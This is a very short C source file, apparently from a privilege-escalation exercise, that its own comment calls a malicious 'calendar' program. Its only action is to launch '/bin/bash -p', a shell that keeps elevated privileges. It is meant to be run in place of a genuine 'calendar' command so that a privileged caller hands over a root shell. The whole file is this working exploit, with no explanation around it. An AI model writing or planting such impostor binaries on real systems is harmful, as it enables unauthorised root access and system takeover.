/* our malicious "calendar" program */

#include <stdlib.h>

int main()
{
   system("/bin/bash -p");
}

